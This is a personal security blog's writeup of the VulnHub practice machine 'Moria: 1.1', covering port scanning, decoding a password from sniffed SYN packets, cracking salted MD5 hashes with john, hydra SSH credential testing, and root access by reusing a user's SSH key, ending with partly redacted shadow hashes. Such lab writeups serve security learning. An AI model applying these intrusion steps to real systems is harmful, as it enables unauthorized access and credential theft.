<!DOCTYPE html>
<html lang="en" data-theme-mode="light">
<head>
  <meta charset="utf-8">
  <meta name="author" content="Ankur Tyagi (@7h3rAm)">
  <meta name="description" content="Personal Weblog">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Manthan</title>
  <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp">
  <link rel="stylesheet" href="/static/css/base.css">
  <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
  <script src="/static/js/theme.js"></script>
  <script src="/static/js/highlight.min.js"></script>
  <script src="/static/js/hljs-bash.min.js"></script>
  <script src="/static/js/hljs-python.min.js"></script>
  <script src="/static/js/hljs-sql.min.js"></script>
  <script src="/static/js/hljs-powershell.min.js"></script>
  <script src="/static/js/hljs-line-numbers.min.js"></script>
</head>
<body>

<header>
  <div>
    <h1 class="site-title"><a href="/" style="color:inherit;text-decoration:none;">manthan</a></h1>
    <p class="meta">security research | code | writeups</p>
  </div>
</header>

<article id="top">
  <div class="post-header">
    <div style="display:flex; justify-content:space-between; align-items:flex-start;">
      <div>
        <h1 class="post-title" style="margin:0; cursor:pointer;" onclick="toggleAllSections()">[VulnHub] Moria: 1.1</h1>
      </div>
      <div class="meta" style="text-align:right;">
        <div>17/Oct/2019</div>
        <div class="tags"><a href="/tags.html#vulnhub">vulnhub</a>, <a href="/tags.html#writeup">writeup</a></div>
      </div>
    </div>
    <nav class="post-nav" style="margin-top:0.3em;">
      <a class="nav-prev" href="/posts/20191011_vulnhub-misdirection1.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[VulnHub] Misdirection: 1</span></a>      <a class="nav-next" href="/posts/20191021_vulnhub-mrrobot1.html"><span class="nav-title">[VulnHub] Mr-Robot: 1</span> <span class="arrow">&gt;&gt;&gt;</span></a>    </nav>
  </div>

  <div class="content">
    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/moria-1,187/">Moria: 1.1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_moria11/machinescli.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
<p class="nested active">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_moria11/killchain.png.webp" /></p>
<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
<p class="nested active">1. Here's the Nmap scan result:  </p>
<pre class="nested active"><code># Nmap 7.70 scan initiated Fri Oct 11 15:31:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/xml/_quick_tcp_nmap.xml 192.168.92.188
Nmap scan report for 192.168.92.188
Host is up, received arp-response (0.0019s latency).
Scanned at 2019-10-11 15:32:02 PDT for 15s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey:
|   2048 47:b5:ed:e3:f9:ad:96:88:c0:f2:83:23:7f:a3:d3:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5gdKNO3UCeDGX36RIZSkcVHvWknoFBZe2IT96Gep79sECS7G2pO76RFdOCJMru0Ek9EQKhMhHTrVI0DWDJFp2apdEPVsqn8nuJKUCHbaL49frQtFnR64b5WoM+f7VgEN84S+iPmUCwwgIMjR5hoYCAJFdJNpE27ZguVbnnN+i1491TDIO/cN92Uut/T70C3bntlsptY9N+fR0hOdkLg+K+TT1zX2BZOw99OMn9ytt3kSi4DNaoDpn9GDOfXhqeQH/eJWmFNTsFSM2+GHOAZKc0Ichiqhxf3WHoGOnliH8XdV6ZNpjHA8jGCYVcPnkTk42nP7E9Ql7mabsi+L3Ugq3
|   256 85:cd:a2:d8:bb:85:f6:0f:4e:ae:8c:aa:73:52:ec:63 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=
|   256 b1:77:7e:08:b3:a0:84:f8:f4:5d:f9:8e:d5:85:b9:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxa4UjJJ2naeaBginolO5UHAS/rB0Wh5mtDLQuNUYaN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Gates of Moria
MAC Address: 00:0C:29:84:7D:D1 (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 11 15:32:18 2019 -- 1 IP address (1 host up) scanned in 28.21 seconds
</code></pre>
<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_moria11/openports.png.webp" />  </p>
<p class="nested active">3. We find a possible username from FTP banner:  </p>
<pre class="nested active"><code>PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
|_banner: 220 Welcome Balrog!
</code></pre>
<p class="nested active">4. We find a few interesting directories from <code>gobuster</code> scan. Exploring the <code>http://192.168.92.188:80/w</code> link, we follow it till the <code>http://192.168.92.188/w/h/i/s/p/e/r/the_abyss/</code> link which shows some random text:  </p>
<pre class="nested active"><code>http://192.168.92.188:80/cgi-bin/ (Status: 403) [Size: 210]
http://192.168.92.188:80/cgi-bin/.html (Status: 403) [Size: 215]
http://192.168.92.188:80/index.php (Status: 200) [Size: 85]
http://192.168.92.188:80/index.php (Status: 200) [Size: 85]
http://192.168.92.188:80/w (Status: 301)
http://192.168.92.188/w/h/i/s/p/e/r/the_abyss/
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_moria11/screenshot01.png.webp" />  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_moria11/screenshot02.png.webp" />  </p>
<p class="nested active">5. This link shows text that seems to be hinting towards port knocking, but we don't know the ports to knock on. Upon further exploration, it seems one of the text also hints towards <code>listening</code> or sniffing that could prove useful:  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_moria11/screenshot03.png.webp" />  </p>
<p class="nested active">6. We run <code>wireshark</code> with a display filter <code>ip.addr == 192.168.92.188</code> to limit noise. In some time we see a bunch of <code>SYN</code> packets being sent to us from the target system. These packets are sent to following ports: <code>77, 101, 108, 108, 111, 110</code>  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_moria11/screenshot04.png.webp" />  </p>
<p class="nested active">7. We try to knock these ports on the target system but nothing changed. Upon further exploration, it is found that the sequence actually is the ASCII values for a string <code>Mellon</code> that could be the password for the only known username we have as of now: <code>Balrog</code>  </p>
<pre class="nested active"><code>nmap -Pn --host-timeout 100 --max-retries 0 -sS -p 77, 101, 108, 108, 111, 110
python -c 'print &quot;&quot;.join([chr(x) for x in [77, 101, 108, 108, 111, 110]])'
  Mellon
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.7.1" src="/static/files/posts_vulnhub_moria11/screenshot05.png.webp" />  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.7.2" src="/static/files/posts_vulnhub_moria11/screenshot06.png.webp" />  </p>
<p class="nested active">8. We tried to connect to FTP service with the <code>Balrog/Mellon</code> credentials but for some reason it didn't work:  </p>
<pre class="nested active"><code>ftp 192.168.92.188
  Balrog
  Mellon
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_vulnhub_moria11/screenshot07.png.webp" />  </p>
<p class="nested active">9. From public writeups we find that the FTP user has access to the web root directory and this directory has an interesting file: <code>http://192.168.92.188/QlVraKW4fbIkXau9zkAPNGzviT3UKntl</code>  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.9.1" src="/static/files/posts_vulnhub_moria11/screenshot08.png.webp" />  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.9.2" src="/static/files/posts_vulnhub_moria11/screenshot09.png.webp" />  </p>
<p class="nested active">10. This file lists several usernames and what looks like password hashes. The page source also reveals the password salts and hash format as <code>MD5(MD5(Password).Salt)</code>. We find a good <a href="https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC">reference</a> for <code>john</code>'s dynamic hash variants. We create a <code>hashes</code> file by adding usernames, hashes and salts to it. We can now use <code>john</code> to crack these hashes:  </p>
<pre class="nested active"><code>john --format=dynamic_6 hashes
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.10.1" src="/static/files/posts_vulnhub_moria11/screenshot10.png.webp" />  </p>
<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
<pre class="nested active"><code>21/tcp  |  ftp   |  vsftpd 2.0.8 or later
22/tcp  |  ssh   |  OpenSSH 6.6.1 (protocol 2.0)
80/tcp  |  http  |  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
</code></pre>
<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
<pre class="nested active"><code>http://192.168.92.188/QlVraKW4fbIkXau9zkAPNGzviT3UKntl
</code></pre>
<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
<pre class="nested active"><code>ftp: Balrog
</code></pre>
<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
<p class="nested active">1. We are able to successfully crack hashes for all users from this list and can now use <code>hydra</code> to check which username/password combo actually works. We find that the <code>Ori/spanky</code> credentials allow us SSH access to the target system:  </p>
<pre class="nested active"><code>hydra -C creds 192.168.92.188 -t 4 ssh
ssh Ori@192.168.92.188
</code></pre>
<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_moria11/screenshot11.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_moria11/screenshot12.png.webp" />  </p>
<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
<pre class="nested active"><code>Ori@Moria&gt; id
uid=1002(Ori) gid=1003(notBalrog) groups=1003(notBalrog)
Ori@Moria&gt;  
Ori@Moria&gt; uname
Linux Moria 3.10.0-514.el7.x86_64 #1 SMP Tue Nov 22 16:42:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
Ori@Moria&gt;  
Ori@Moria&gt; ifconfig
ens33:  flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.92.188  netmask 255.255.255.0  broadcast 192.168.92.255
        inet6 fe80::deef:db78:6f77:ebdf  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:0c:29:84:7d:d1  txqueuelen 1000  (Ethernet)
        RX packets 125  bytes 13540 (13.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 87  bytes 11999 (11.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
Ori@Moria&gt;  
Ori@Moria&gt; users
abatchy
Balrog
Ori
</code></pre>
<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
<p class="nested active">1. We find that the user <code>Ori</code> has an entry for <code>localhost</code> within the <code>.ssh/known_hosts</code> file. This means, if local SSH configuration allows <code>root</code> user login and user <code>Ori</code>'s public key is in the <code>authorized_keys</code> of <code>root</code> user, we can SSH as <code>root</code> to localhost using <code>Ori</code>'s public key:  </p>
<pre class="nested active"><code>ssh -i id_rsa root@192.168.92.188
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_moria11/screenshot13.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_moria11/screenshot14.png.webp" />  </p>
<p class="nested active">2. We gain elevated access using the above technqiue and can now view the flag to complete the challenge:  </p>
<pre class="nested active"><code>cat /root/flag.txt
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_moria11/screenshot15.png.webp" />  </p>
<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
<pre class="nested active"><code>root:$6$P7ElNgGp$fNzyy4OgqSR1ANJXTgbpzp4U42JXG1qJ55iNV10NVJoX5UWjtckWD0oHmcTOj0lqObyWhFu2y3udHVpHa........................
abatchy:$6$xEq/159Q$ScuKnynbwTBdFA4B9w6OqKxQpWPGpofi59McVuP6T1SADKhNy4n33Ovkk0hwZQkx72XriPSIrc2ubr16O........................
Balrog:$6$J6kuCfxq$L5ALsHRYfOu0bVV9MbW3.VZOUVEaKSWhfPIq5wXUFV407tpvH8Zx7WdbJeXgdWoPo9LU8eIznf0d44qoF........................
Ori:$6$1zYgjEIM$VQ0gvU7JjenS9WuiVjSeva8pbWnEXjqTmEdFnQRXKmTmXPXmt55/oyup40NiXD8J9GxmXF7DYiaHZDRshr.......................
</code></pre>
<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
<pre class="nested active"><code>ftp: Balrog/Mel...
ssh: Ori/span..
</code></pre>
<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
<ul class="nested active">
<li><a href="https://www.vulnhub.com/entry/moria-11,187/">https://www.vulnhub.com/entry/moria-11,187/</a>  </li>
<li><a href="https://phackt.com/moria-vulnhub">https://phackt.com/moria-vulnhub</a>  </li>
</ul>
  </div>

  <nav class="post-nav" style="margin-top:1em;">
    <a class="nav-prev" href="/posts/20191011_vulnhub-misdirection1.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">[VulnHub] Misdirection: 1</span></a>    <a class="nav-next" href="/posts/20191021_vulnhub-mrrobot1.html"><span class="nav-title">[VulnHub] Mr-Robot: 1</span> <span class="arrow">&gt;&gt;&gt;</span></a>  </nav>
</article>

<script>
document.addEventListener('DOMContentLoaded', function() {
  var content = document.querySelector('.content');
  if (content) {
    var headings = content.querySelectorAll('h2,h3,h4,h5,h6');
    headings.forEach(function(h) {
      var link = document.createElement('a');
      link.href = '#top';
      link.className = 'top-link';
      link.textContent = ' [^]';
      link.style.fontSize = '0.8em';
      link.style.color = 'var(--muted)';
      h.appendChild(link);
    });
  }
});
</script>

<footer>
  <p class="nested active">cc-by-sa-4.0</p>
</footer>

<aside class="sidebar">
  <div class="sidebar-content">
    <h4 class="h4 collapsible" onclick="toggle(this);">navigation</h4>
    <a href="/">home</a>
    <a href="/archive.html">archive</a>
    <a href="/tags.html">tags</a>
    <a href="/stats.html">stats</a>
    <hr>
    <a href="https://github.com/@7h3rAm">github</a>
    <a href="https://twitter.com/@7h3rAm">twitter</a>
    <hr>
    <h4 class="h4 collapsible" onclick="toggle(this);">toggles</h4>
    <div class="toggle-group">
      <button class="toggle-btn toggle-theme" onclick="toggleThemeMode()">◑ theme</button>
      <button class="toggle-btn toggle-density" onclick="toggleDensity()">▥ density</button>
      <button class="toggle-btn toggle-width" onclick="toggleWidth()">▱ width</button>
      <button class="toggle-btn toggle-justify" onclick="toggleJustify()">¶ justify</button>
      <button class="toggle-btn toggle-collapse" onclick="toggleAllSections()">±</button>
    </div>
  </div>
</aside>

<script>hljs.configure({ignoreUnescapedHTML: true}); hljs.highlightAll(); hljs.initLineNumbersOnLoad();</script>
</body>
</html>